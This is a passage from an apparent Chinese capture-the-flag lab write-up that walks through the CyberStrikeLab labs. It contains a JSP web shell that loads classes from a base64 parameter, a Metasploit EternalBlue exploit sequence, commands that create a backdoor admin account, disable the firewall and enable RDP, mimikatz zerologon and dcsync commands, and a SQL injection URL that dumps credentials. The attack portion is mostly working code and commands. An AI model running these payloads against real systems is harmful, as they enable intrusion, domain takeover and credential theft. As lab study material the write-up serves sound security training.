</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="n">byte</span><span class="p">[])</span> <span class="n">clazz</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;decodeBuffer&#34;</span><span class="p">,</span> <span class="ne">String</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">clazz</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(),</span> <span class="nb">str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;java.util.Base64&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="ne">Object</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;getDecoder&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="n">byte</span><span class="p">[])</span> <span class="n">decoder</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;decode&#34;</span><span class="p">,</span> <span class="ne">String</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">decoder</span><span class="p">,</span> <span class="nb">str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;passwd&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">cls</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">U</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getClassLoader</span><span class="p">())</span><span class="o">.</span><span class="n">g</span><span class="p">(</span><span class="n">base64Decode</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span><span class="o">.</span><span class="n">newInstance</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">pageContext</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116141733213.png"
	width="1909"
	height="1201"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116141733213_hu17263871521051499755.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116141733213_hu3206671690543673294.png 1024w"
	loading="lazy"
	
		alt="image-20260116141733213"
	
	
		class="gallery-image" 
		data-flex-grow="158"
		data-flex-basis="381px"
	
></p>
<p>得到第二个flag</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116141954250.png"
	width="500"
	height="211"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116141954250_hu12443695947381840436.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116141954250_hu5800452664928768546.png 1024w"
	loading="lazy"
	
		alt="image-20260116141954250"
	
	
		class="gallery-image" 
		data-flex-grow="236"
		data-flex-basis="568px"
	
></p>
<h3 id="flag3-1">flag3
</h3><h4 id="知识点永恒之蓝">知识点：永恒之蓝
</h4><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116142244189.png"
	width="881"
	height="423"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116142244189_hu9712138064029243615.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116142244189_hu13678653778614293615.png 1024w"
	loading="lazy"
	
		alt="image-20260116142244189"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="499px"
	
></p>
<p>发现内网<code>ip</code>，配置一下<code>stowaway</code>并上传<code>fscan</code>进行扫描，发现<code>20.30</code>有一个永恒之蓝</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116151843088.png"
	width="891"
	height="795"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116151843088_hu5963819600162124883.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116151843088_hu15291454271008760201.png 1024w"
	loading="lazy"
	
		alt="image-20260116151843088"
	
	
		class="gallery-image" 
		data-flex-grow="112"
		data-flex-basis="268px"
	
></p>
<p>直接打就行，发现可以拿<code>shell</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">proxychains</span>  <span class="n">msfconsole</span>
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms17_010_eternalblue</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp_uuid</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">RHOSTS</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">20.30</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">1444</span>
</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116162910341.png"
	width="943"
	height="673"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116162910341_hu2637495019822769817.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116162910341_hu2098865262854542330.png 1024w"
	loading="lazy"
	
		alt="image-20260116162910341"
	
	
		class="gallery-image" 
		data-flex-grow="140"
		data-flex-basis="336px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116163017206.png"
	width="617"
	height="153"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116163017206_hu5943161991222305424.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116163017206_hu3138734227150314843.png 1024w"
	loading="lazy"
	
		alt="image-20260116163017206"
	
	
		class="gallery-image" 
		data-flex-grow="403"
		data-flex-basis="967px"
	
></p>
<p>这里靶场全打完了，其实还可以加载<code>mimikatz</code>模块抓取哈希打dcsync获取域控</p>
<h2 id="lab3">lab3
</h2><h3 id="flag1-2">flag1
</h3><h4 id="知识点cms简单cve">知识点：CMS简单cve
</h4><p>老规矩fscan，可以发现一台10有个cve，233有个404的8080端口</p>
<p><img src="C:%5cUsers%5c28105%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20260116171511249.png"
	
	
	
	loading="lazy"
	
		alt="image-20260116171511249"
	
	
></p>
<p>不过10这个cve好像运行不了，打了exp打不出，那就看看10又没有其他端口运行了服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fscan.exe -h 192.168.10.10 -p 1-65535
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现有一个<code>CMS</code>，登录后台的地方存在默认用户和密码，有一个专门的CVE可以打，在文件管理处可以写入php木马</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116175316614.png"
	width="1145"
	height="787"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116175316614_hu6751374503758607445.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116175316614_hu12306685528946544235.png 1024w"
	loading="lazy"
	
		alt="image-20260116175316614"
	
	
		class="gallery-image" 
		data-flex-grow="145"
		data-flex-basis="349px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116175337170.png"
	width="416"
	height="195"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116175337170_hu6903806516236785282.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116175337170_hu15305116077667515194.png 1024w"
	loading="lazy"
	
		alt="image-20260116175337170"
	
	
		class="gallery-image" 
		data-flex-grow="213"
		data-flex-basis="512px"
	
></p>
<h3 id="flag2-2">flag2
</h3><h4 id="知识点爆破木马后门密码">知识点：爆破木马后门密码？
</h4><p>看一下10这里存不存在内网</p>
<p>明显是存在的，那么就建立连接吧</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116175418815.png"
	width="787"
	height="591"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116175418815_hu16609618823968975541.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116175418815_hu11183232822204022601.png 1024w"
	loading="lazy"
	
		alt="image-20260116175418815"
	
	
		class="gallery-image" 
		data-flex-grow="133"
		data-flex-basis="319px"
	
></p>
<p>上传<code>stowaway</code>和<code>fscan</code>进行一波扫描</p>
<p>扫到了两台机子，但是没有什么有用的信息，这里提示说20留了后门，所以20一定有端口运行了http服务</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116181448365.png"
	width="969"
	height="328"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116181448365_hu2470046579338461105.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116181448365_hu947161641746084238.png 1024w"
	loading="lazy"
	
		alt="image-20260116181448365"
	
	
		class="gallery-image" 
		data-flex-grow="295"
		data-flex-basis="709px"
	
></p>
<p>我们扫一波看看</p>
<p>发现<code>8055</code>这个端口存在<code>thinkphp</code>，然后因为有后门在首页，我们需要爆破一下后门密码</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116202539605.png"
	width="683"
	height="480"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116202539605_hu17146910540105037362.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116202539605_hu12755335259933972522.png 1024w"
	loading="lazy"
	
		alt="image-20260116202539605"
	
	
		class="gallery-image" 
		data-flex-grow="142"
		data-flex-basis="341px"
	
></p>
<p><a class="link" href="https://github.com/theLSA/awBruter"  target="_blank" rel="noopener"
    >theLSA/awBruter: 千倍速一句话木马密码爆破工具</a></p>
<p>有点鸡肋，很多报错，不过聊胜于无（要修改一下代码）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116212422637.png"
	width="1027"
	height="630"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116212422637_hu1489164421261491054.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116212422637_hu5743857922083245291.png 1024w"
	loading="lazy"
	
		alt="image-20260116212422637"
	
	
		class="gallery-image" 
		data-flex-grow="163"
		data-flex-basis="391px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116213000724.png"
	width="1007"
	height="238"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116213000724_hu5197375862757173932.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116213000724_hu6241740643787861015.png 1024w"
	loading="lazy"
	
		alt="image-20260116213000724"
	
	
		class="gallery-image" 
		data-flex-grow="423"
		data-flex-basis="1015px"
	
></p>
<h3 id="flag3-2">flag3
</h3><h4 id="知识点rdpzerologon置空密码抓哈希打pth">知识点：RDP、zerologon置空密码抓哈希打PTH
</h4><p>这里因为是系统用户，直接开一个<code>RDP</code>远程登录一下，然后用<code>mimikatz</code>抓哈希打<code>PTH</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net user liernian qwer123! /add
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">net localgroup Administrators liernian /add
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34;
</span></span><span class="line"><span class="cl">&#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
</span></span><span class="line"><span class="cl">netsh advfirewall set allprofiles state off
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v UserAuthentication /t REG_DWORD /d 0 /f
</span></span></code></pre></td></tr></table>
</div>
</div><p>这还是个域控，需要加./用户名</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116214605519.png"
	width="831"
	height="399"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116214605519_hu2225630140452595113.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116214605519_hu13377934579688670709.png 1024w"
	loading="lazy"
	
		alt="image-20260116214605519"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="499px"
	
></p>
<p>登录成功后直接抓哈希</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116214803855.png"
	width="1783"
	height="690"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116214803855_hu14317579298196011432.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116214803855_hu10271641148226801853.png 1024w"
	loading="lazy"
	
		alt="image-20260116214803855"
	
	
		class="gallery-image" 
		data-flex-grow="258"
		data-flex-basis="620px"
	
></p>
<p>发现抓不到，原来是打<code>zerologon</code>，将密码置空拿哈希</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">lsadump::zerologon /target:cyberstrikelab.com  /ntlm /null /account:WIN-7NRTJO59O7N$ /exploit 
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116224314474.png"
	width="737"
	height="362"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116224314474_hu17105661863016946858.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116224314474_hu15927095508709280117.png 1024w"
	loading="lazy"
	
		alt="image-20260116224314474"
	
	
		class="gallery-image" 
		data-flex-grow="203"
		data-flex-basis="488px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lsadump::dcsync /csv /domain:cyberstrikelab.com /dc:WIN-7NRTJO59O7N.cyberstrikelab.com /user:administrator /authuser:WIN-7NRTJO59O7N$ /authpassword:&#34;&#34; /authntlm
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116230219820.png"
	width="964"
	height="211"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116230219820_hu11919694256420566622.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116230219820_hu14646246546246738806.png 1024w"
	loading="lazy"
	
		alt="image-20260116230219820"
	
	
		class="gallery-image" 
		data-flex-grow="456"
		data-flex-basis="1096px"
	
></p>
<p>有哈希直接打PTH</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116230513645.png"
	width="1072"
	height="230"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116230513645_hu17078990602594539503.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260116230513645_hu7689179880896745301.png 1024w"
	loading="lazy"
	
		alt="image-20260116230513645"
	
	
		class="gallery-image" 
		data-flex-grow="466"
		data-flex-basis="1118px"
	
></p>
<h2 id="lab4">lab4
</h2><h3 id="flag1-3">flag1
</h3><h4 id="知识点cmssql报错注入目录穿越修改php文件">知识点：CMS，sql报错注入+目录穿越修改php文件
</h4><p>老规矩<code>fscan</code>，但是没扫到什么东西，应该还是要扫描全部端口</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117195719944.png"
	width="1437"
	height="293"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117195719944_hu16562021779147516741.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117195719944_hu8725098767198278581.png 1024w"
	loading="lazy"
	
		alt="image-20260117195719944"
	
	
		class="gallery-image" 
		data-flex-grow="490"
		data-flex-basis="1177px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117204907856.png"
	width="1852"
	height="306"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117204907856_hu12240988779059636102.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117204907856_hu3894403592870916546.png 1024w"
	loading="lazy"
	
		alt="image-20260117204907856"
	
	
		class="gallery-image" 
		data-flex-grow="605"
		data-flex-basis="1452px"
	
></p>
<p>发现<code>5820</code>有服务</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200146818.png"
	width="1709"
	height="791"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200146818_hu9617083517739266566.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200146818_hu11157437403988418138.png 1024w"
	loading="lazy"
	
		alt="image-20260117200146818"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="518px"
	
></p>
<p>在<code>ad_js.php</code>有sql注入漏洞，会回显在第七个字段</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200405155.png"
	width="1083"
	height="205"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200405155_hu11122328118631520199.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200405155_hu13491855565992316840.png 1024w"
	loading="lazy"
	
		alt="image-20260117200405155"
	
	
		class="gallery-image" 
		data-flex-grow="528"
		data-flex-basis="1267px"
	
></p>
<p>可以用报错注入获取admin密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.10.10:5820/ad_js.php?ad_id=1 UNION SELECT 1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200559982.png"
	width="634"
	height="226"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200559982_hu17719252903083793868.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200559982_hu3852624691973541848.png 1024w"
	loading="lazy"
	
		alt="image-20260117200559982"
	
	
		class="gallery-image" 
		data-flex-grow="280"
		data-flex-basis="673px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200735608.png"
	width="1032"
	height="348"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200735608_hu8482468963678477552.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117200735608_hu523963077666424847.png 1024w"
	loading="lazy"
	
		alt="image-20260117200735608"
	
	
		class="gallery-image" 
		data-flex-grow="296"
		data-flex-basis="711px"
	
></p>
<p>这密码，感觉爆破也能得到</p>
<p>登录后在这里可以修改内容</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117201535072.png"
	width="734"
	height="364"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117201535072_hu5966751624607924486.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117201535072_hu5716232594138047951.png 1024w"
	loading="lazy"
	
		alt="image-20260117201535072"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="483px"
	
></p>
<p>这个网址可以通过目录穿越指定要修改的文件</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117202133075.png"
	width="1517"
	height="949"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117202133075_hu2221253612213267152.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117202133075_hu7652360703419565494.png 1024w"
	loading="lazy"
	
		alt="image-20260117202133075"
	
	
		class="gallery-image" 
		data-flex-grow="159"
		data-flex-basis="383px"
	
></p>
<p>可以找<code>php</code>文件去修改内容</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203237521.png"
	width="1026"
	height="400"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203237521_hu10438822824555766719.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203237521_hu6314977553557266996.png 1024w"
	loading="lazy"
	
		alt="image-20260117203237521"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="615px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203127201.png"
	width="1093"
	height="697"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203127201_hu15768374937310596390.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203127201_hu8456484432301149582.png 1024w"
	loading="lazy"
	
		alt="image-20260117203127201"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="376px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203423394.png"
	width="355"
	height="268"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203423394_hu13786990388006430159.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203423394_hu15605757297078476248.png 1024w"
	loading="lazy"
	
		alt="image-20260117203423394"
	
	
		class="gallery-image" 
		data-flex-grow="132"
		data-flex-basis="317px"
	
></p>
<h3 id="flag2flag3">flag2&amp;flag3
</h3><h4 id="知识点zerologon置空密码抓取哈希">知识点：zerologon置空密码抓取哈希
</h4><p>有内网，我们可以直接传<code>stowaway</code>和<code>fscan</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203528649.png"
	width="828"
	height="647"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203528649_hu14044727449867629886.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117203528649_hu8994985543634949935.png 1024w"
	loading="lazy"
	
		alt="image-20260117203528649"
	
	
		class="gallery-image" 
		data-flex-grow="127"
		data-flex-basis="307px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117205009189.png"
	width="1658"
	height="625"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117205009189_hu7688218373166608312.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117205009189_hu9203257436105896687.png 1024w"
	loading="lazy"
	
		alt="image-20260117205009189"
	
	
		class="gallery-image" 
		data-flex-grow="265"
		data-flex-basis="636px"
	
></p>
<p>全端口扫描后发现没有web端口，尝试获取一下域控服务器的信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ipconfig /all
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117205812340.png"
	width="947"
	height="362"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117205812340_hu6126196761248415525.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260117205812340_hu1664524869979633954.png 1024w"
	loading="lazy"
	
		alt="image-20260117205812340"
	
	
		class="gallery-image" 
		data-flex-grow="261"
		data-flex-basis="627px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
